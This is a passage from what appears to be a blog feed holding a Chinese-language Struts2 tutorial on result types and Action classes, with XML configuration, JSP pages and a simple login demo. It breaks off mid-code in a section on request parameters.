<span class="attr">class</span>=<span class="string">"com.mi1k7ea.domain.HelloWorldAction"</span> <span class="attr">method</span>=<span class="string">"execute"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"success"</span> <span class="attr">type</span>=<span class="string">"freemarker"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"location"</span>&gt;</span>/hello.fm<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果如下，看到渲染与JSP视图完全相同，只是我们不绑定使用JSP作为视图技术：</p><p><img src="/2020/05/01/Struts2基础篇之ResultType（结果类型）/1.png" alt=""></p><p><img src="/2020/05/01/Struts2基础篇之ResultType（结果类型）/2.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
      <category term="Struts2" scheme="https://www.mi1k7ea.com/categories/Java/Struts2/"/>
    
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Struts2" scheme="https://www.mi1k7ea.com/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>Struts2基础篇之Action</title>
    <link href="https://www.mi1k7ea.com/2020/05/01/Struts2%E5%9F%BA%E7%A1%80%E7%AF%87%E4%B9%8BAction/"/>
    <id>https://www.mi1k7ea.com/2020/05/01/Struts2基础篇之Action/</id>
    <published>2020-04-30T16:00:01.000Z</published>
    <updated>2020-08-15T06:40:16.698Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-参考"><a href="#0x00-参考" class="headerlink" title="0x00 参考"></a>0x00 参考</h2><p>本笔记直接参考或引自如下链接文章：</p><p><a href="http://c.biancheng.net/struts2/" target="_blank" rel="noopener">http://c.biancheng.net/struts2/</a></p><p><a href="https://www.w3cschool.cn/struts_2/" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/</a></p><h2 id="0x01-Action配置详解"><a href="#0x01-Action配置详解" class="headerlink" title="0x01 Action配置详解"></a>0x01 Action配置详解</h2><p>Action是用于处理请求操作的，它是由StrutsPrepareAndExecuteFilter分发过来的。</p><h3 id="实现Action控制类"><a href="#实现Action控制类" class="headerlink" title="实现Action控制类"></a>实现Action控制类</h3><p>在 Struts2 中，一个 Action 类代表一次请求或调用，每个请求的动作都对应一个相应的 Action 类。也就是说，用户的每次请求，都会转到一个相应的 Action 类中，由这个 Action 类进行处理。简而言之，Action 就是用于处理一次用户请求的对象。</p><h4 id="实现Action接口"><a href="#实现Action接口" class="headerlink" title="实现Action接口"></a>实现Action接口</h4><p>当 Action 类处理用户请求成功后，有人习惯返回 index 字符串，有人习惯返回 success 字符串，这会导致在一个 Action 中可能会返回各种不同的值，十分不利于项目的统一管理。</p><p>为了让用户更规范地创建 Action 类，Struts2 提供了一个 Action 接口，该接口定义了 Action 类应该实现的规范，用户在创建 Action 时，可以实现这个接口。Action 接口中的具体代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Action</span> </span>&#123;</span><br><span class="line">    <span class="comment">//定义Action接口中包含的一些结果字符串</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String SUCCESS=<span class="string">"success"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String NONE=<span class="string">"none"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String ERROR=<span class="string">"error"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String INPUT=<span class="string">"input"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String LOGIN=<span class="string">"login"</span>;</span><br><span class="line">    <span class="comment">//定义处理用户请求的execute()方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上述代码中可以看出，Action 接口位于 com.opensymphony.xwork2 包中，并且接口中只定义了五个字符串常量和一个 execute() 方法。其中，execute() 方法是 Action 类的默认请求处理方法，该方法返回一个字符串，而上面五个字符串常量的作用是统一 execute() 方法的返回值。</p><h4 id="继承ActionSupport类"><a href="#继承ActionSupport类" class="headerlink" title="继承ActionSupport类"></a>继承ActionSupport类</h4><p>由于 Xwork 的 Action 接口十分简单，为开发者提供的帮助较小，所以在实际开发过程中，通常都是采用继承 ActionSupport 类的方式创建 Action。其示例代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ActionSupport 是 Action 接口的默认实现类，所以继承 ActionSupport 就相当于实现了 Action 接口。除 Action 接口以外，ActionSupport 类还实现了 Validateable、ValidationAware、TextProvider、LocaleProvider 和 Serializable 等接口，这为用户提供了更多的功能。</p><p>ActionSupport 类中提供了许多默认方法，这些默认方法包括数据校验的方法、默认的处理用户请求的方法等。如果开发者的 Action 类继承 ActionSupport 类，会大大简化 Action 的开发。</p><p>需要注意的是，由于自定义的 Action 类继承了 ActionSupport 类，因此必须定义一个变量 serialVersionUID。这是因为 ActionSupport 类实现了 Serializable 接口，任何实现了 Serializable 接口的类都必须声明变量 serialVersionUID，如下所示：  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br></pre></td></tr></table></figure><p>在学习过程中，细心的读者可能会发现，即使不加上述代码，程序也可以正常执行。但是在实际项目开发中，必须加上上述代码。</p><h3 id="配置Action"><a href="#配置Action" class="headerlink" title="配置Action"></a>配置Action</h3><p>配置 Action 主要就是配置 struts.xml 文件中 Action 的映射信息。Action 映射是指将一个请求的 URL 映射到一个 Action 类，当一个请求匹配某个 Action 名称时，Struts2 框架就使用这个 Action 确定如何处理请求。</p><p>struts.xml 文件是通过 <code>&lt;action&gt;</code> 元素对请求的 Action 和 Action 类进行配置的，其示例代码如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"userAction"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.action.UserAction"</span> <span class="attr">method</span>=<span class="string">"add"</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在上述代码中，包含了 <code>&lt;action&gt;</code> 元素的三个常用属性 name、class 和 method，这三个属性的具体说明如下表所示。</p><table><thead><tr><th>名  称</th><th>可选/必填</th><th>说  明</th></tr></thead><tbody><tr><td>name</td><td>必填属性</td><td>表示 Action 的名称（该名称必须唯一），它指定了 Action 所处理请求的 URL。该属性将在其他地方被引用，如作为 JSP 页面 form 表单的 action 属性值。</td></tr><tr><td>class</td><td>可选属性</td><td>用于指定 Action 的实现类，如果没有指定 class 属性值，则其默认值为 com.opensymphony.xwork2.ActionSupport 类。</td></tr><tr><td>method</td><td>可选属性</td><td>指定请求 Action 时调用的方法。如果指定了 method 属性，则该 Action 会调用 method 属性中指定的方法，如果不指定 method 属性，则 Action 会调用 execute() 方法。</td></tr></tbody></table><h3 id="使用通配符"><a href="#使用通配符" class="headerlink" title="使用通配符"></a>使用通配符</h3><p>由于在一个 Action 类中可能有多个业务逻辑处理方法，在配置 Action 时，就需要使用多个 <code>&lt;action&gt;</code> 元素。在实现同样功能的情况下，为了减少 struts.xml 配置文件的代码量，可以借助于通配符映射信息。</p><p>下面以一段 Action 的配置代码为例，说明如何使用通配符进行配置，如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"user"</span> <span class="attr">namespace</span>=<span class="string">"/user"</span> <span class="attr">extends</span>=<span class="string">"struts-default"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"userAction_*"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.action.UserAction"</span> <span class="attr">method</span>=<span class="string">"&#123;1&#125;"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在上述代码中，method 属性值中的数字1表示匹配第 1 个 <code>*</code>。当客户端发送 /user/userAction_login.action 这样的请求时，<code>&lt;action&gt;</code> 元素的 name 属性值就被设置成 userAction_login，method 属性值就被设置成 login。当客户端发送 /user/userAction_register.action 这样的请求时，<code>&lt;action&gt;</code> 元素的 name 属性值就被设置为 userAction_register，method 属性值也被设置成 register。</p><p>另外，对 <code>&lt;result&gt;</code> 元素也可以采用通配符配置，代码如下所示：  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">result</span>&gt;</span>/(1).jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当客户端发送 userAction_login 这样的请求时，<code>&lt;result&gt;</code> 元素被设置成跳转到 login.jsp 页面。当客户端发送 userAction_register 这样的请求时，<code>&lt;result&gt;</code>元素被设置成跳转到 register.jsp 页面。</p><h2 id="0x02-Action访问Servlet-API"><a href="#0x02-Action访问Servlet-API" class="headerlink" title="0x02 Action访问Servlet API"></a>0x02 Action访问Servlet API</h2><p>在 Struts2 中，虽然 Action 已经与 Servlet API 完全分离，但在实现业务逻辑时，还是经常要访问 Servlet API 中的对象。</p><p>通常开发时需要访问 Servlet API 中的 HttpServletRequest、HttpSession 和 ServletContext 三个接口，它们分别对应 JSP 内置对象 request、session 和 application。</p><p>在 Struts2 中，访问 Servlet API 通常采用两种方式，分别是通过 ActionContext 访问和通过 ServletActionContext 访问，本节将针对这两种访问方式进行讲解。</p><h3 id="通过ActionContext访问"><a href="#通过ActionContext访问" class="headerlink" title="通过ActionContext访问"></a>通过ActionContext访问</h3><p>ActionContext 是 Action 执行的上下文对象，在 ActionContext 中保存了 Action 执行所需要的所有对象，包括 request、session 和 application 等。ActionContext 类访问 Servlet API 的几个常用方法如表所示。</p><table><thead><tr><th>方法声明</th><th>功能描述</th></tr></thead><tbody><tr><td>void put(String key, Object value)</td><td>将 key-value 键值对放入 ActionContext 中，模拟 Servlet API 中的 HttpServletRequest 的 setAttribute() 方法</td></tr><tr><td>Object get(String key)</td><td>通过参数 key 查找当前 ActionContext 中的值</td></tr><tr><td>Map&lt;String, Object&gt; get Application()</td><td>返回一个 Application 级的 Map 对象</td></tr><tr><td>static ActionContext getContext()</td><td>获取当前线程的 ActionContext 对象</td></tr><tr><td>Map&lt;String, Object&gt; getParameters()</td><td>返回一个包含所有 HttpServletRequest 参数信息的 Map 对象</td></tr><tr><td>Map&lt;String, Object&gt; getSession()</td><td>返回一个 Map 类型的 HttpSession 对象</td></tr></tbody></table><p>要访问 Servlet API，可以通过如下示例代码方式进行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ActionContext context = ActionContext.getContext();</span><br><span class="line">context.put(<span class="string">"name"</span>,<span class="string">"mi1k7ea"</span>);</span><br><span class="line">context.getApplication().put(<span class="string">"name"</span>,<span class="string">"mi1k7ea"</span>);</span><br><span class="line">context.getSession().put(<span class="string">"name"</span>,<span class="string">"mi1k7ea"</span>);</span><br></pre></td></tr></table></figure><p>在上述示例代码中，通过 ActionContext 类中的方法调用，分别在 request、application 和 session 中放入了（”name”，”mi1k7ea”）键值对。通过代码可以看到，ActionContext 类可以非常简单地访问 JSP 内置对象的属性。</p><h4 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h4><p>沿用之前的示例项目继续演示。</p><p>添加login.jsp：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=utf-8"</span></span><br><span class="line">         pageEncoding=<span class="string">"utf-8"</span>%&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;登录页面&lt;/title&gt;</span><br><span class="line">    &lt;style type=<span class="string">"text/css"</span>&gt;</span><br><span class="line">        input[type=text],input[type=password]&#123;width:<span class="number">150</span>px&#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div align=<span class="string">"center"</span>&gt;</span><br><span class="line">    &lt;form action=<span class="string">"login"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">        用户名：&lt;input type=<span class="string">"text"</span> name=<span class="string">"username"</span>/&gt;&lt;br/&gt;</span><br><span class="line">        密&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;码：&lt;input type=<span class="string">"password"</span> name=<span class="string">"password"</span>/&gt;&lt;br/&gt;</span><br><span class="line">        &lt;input type=<span class="string">"reset"</span> value=<span class="string">"重置"</span>/&gt;</span><br><span class="line">        &lt;input type=<span class="string">"submit"</span> value=<span class="string">"登录"</span>/&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>修改success.jsp：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=utf-8"</span></span><br><span class="line">         pageEncoding=<span class="string">"utf-8"</span>%&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;登录成功页面&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;$&#123;success &#125;&lt;br/&gt;&lt;/p&gt;</span><br><span class="line">&lt;h2&gt;用户登录信息&lt;/h2&gt;</span><br><span class="line">用户名：$&#123;username &#125;&lt;br/&gt;</span><br><span class="line">密码：$&#123;password &#125;&lt;br/&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>添加error.jsp：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=utf-8"</span></span><br><span class="line">         pageEncoding=<span class="string">"utf-8"</span>%&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;登录失败页面&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;$&#123;error &#125;&lt;br/&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>编写LoginAction类，主要用于登录逻辑处理：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionContext;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String username; <span class="comment">// 用户名</span></span><br><span class="line">    <span class="keyword">private</span> String password; <span class="comment">// 密码</span></span><br><span class="line">    <span class="comment">// username的getter和setter方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// password的getter和setter方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPassword</span><span class="params">(String password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 获取ActionContext对象</span></span><br><span class="line">        ActionContext context = ActionContext.getContext();</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"admin"</span>.equals(username) &amp;&amp; <span class="string">"123456"</span>.equals(password)) &#123;</span><br><span class="line">            <span class="comment">// 将用户名和密码信息放入context对象中</span></span><br><span class="line">            context.put(<span class="string">"username"</span>, username);</span><br><span class="line">            context.put(<span class="string">"password"</span>, password);</span><br><span class="line">            context.put(<span class="string">"success"</span>, <span class="string">"用户登录成功！"</span>);</span><br><span class="line">            <span class="keyword">return</span> SUCCESS;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 定义登录失败的错误信息</span></span><br><span class="line">            context.put(<span class="string">"error"</span>, <span class="string">"用户名或密码错误，请重新登录！"</span>);</span><br><span class="line">            <span class="keyword">return</span> ERROR;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改struts.xml：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 指定 Struts2 配置文件的 DTD 信息 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE struts PUBLIC</span></span><br><span class="line"><span class="meta">        "-//Apache Software Foundation//DTD Struts Configuration 2.3//EN"</span></span><br><span class="line"><span class="meta">        "http://struts.apache.org/dtds/struts-2.3.dtd"&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Struts2配置文件的根元素 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Struts2的Action必须放在指定的包空间下定义 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"default"</span> <span class="attr">extends</span>=<span class="string">"struts-default"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"login"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.LoginAction"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"success"</span>&gt;</span>/success.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"error"</span>&gt;</span>/error.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果如图：</p><p><img src="/2020/05/01/Struts2基础篇之Action/1.png" alt=""></p><p><img src="/2020/05/01/Struts2基础篇之Action/2.png" alt=""></p><p><img src="/2020/05/01/Struts2基础篇之Action/3.png" alt=""></p><h3 id="通过ServletActionContext访问"><a href="#通过ServletActionContext访问" class="headerlink" title="通过ServletActionContext访问"></a>通过ServletActionContext访问</h3><p>除了通过 ActionContext 类访问 Servlet API 以外，Struts2 框架还提供了 ServletActionContext 类访问 Servlet API，该类中的方法都是静态方法，其常见方法如表所示。</p><table><thead><tr><th>方法声明</th><th>功能描述</th></tr></thead><tbody><tr><td>static PageContext getPageContext()</td><td>获取 Web 应用的 PageContext 对象</td></tr><tr><td>static HttpServletRequest getRequest()</td><td>获取 Web 应用的 HttpServletRequest 对象</td></tr><tr><td>static HttpServletResponse getResponse()</td><td>获取 Web 应用的 HttpServletResponse 对象</td></tr><tr><td>static ServletContext getServletContext()</td><td>获取 Web 应用的 ServletContext 对象</td></tr></tbody></table><h4 id="Demo-1"><a href="#Demo-1" class="headerlink" title="Demo"></a>Demo</h4><p>在前面项目中的 com.mi1k7ea 包下创建 MessageAction 类，编写后的代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"><span class="keyword">import</span> org.apache.struts2.ServletActionContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MessageAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ServletActionContext.getRequest().setAttribute(<span class="string">"message"</span>,<span class="string">"Access Servlet API By ServletActionContext."</span>);</span><br><span class="line">        <span class="keyword">return</span> SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在struts.xml的package标签内添加一个action标签：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"message"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.MessageAction"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"success"</span>&gt;</span>/message.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure><p>创建message.jsp：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div align="center"&gt;$&#123;requestScope.message &#125;&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>运行效果：</p><p><img src="/2020/05/01/Struts2基础篇之Action/4.png" alt=""></p><h2 id="0x03-Action处理请求参数"><a href="#0x03-Action处理请求参数" class="headerlink" title="0x03 Action处理请求参数"></a>0x03 Action处理请求参数</h2><p>在 Struts2 框架中，页面的请求数据和 Action 有两种基本的对应方式，分别是字段驱动（FieldDriven，也称为属性驱动）方式和模型驱动（ModelDriver）方式。</p><h3 id="属性驱动"><a href="#属性驱动" class="headerlink" title="属性驱动"></a>属性驱动</h3><p>属性驱动是指在 Action 中通过字段属性进行与页面之间的数据传递，通常使用时会包括两种情况：一种是与基本数据类型的属性对应，另一种是直接使用域对象。</p><h4 id="基本数据类型字段驱动方式的数据传递"><a href="#基本数据类型字段驱动方式的数据传递" class="headerlink" title="基本数据类型字段驱动方式的数据传递"></a>基本数据类型字段驱动方式的数据传递</h4><p>在 Struts2 中，可以直接在 Action 中定义各种 Java 基本数据类型的字段，使这些字段与表单数据相对应，并利用这些字段进行数据传递，如下面的代码所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String username; <span class="comment">// 用户名</span></span><br><span class="line">    <span class="keyword">private</span> String password; <span class="comment">// 密码</span></span><br><span class="line">    <span 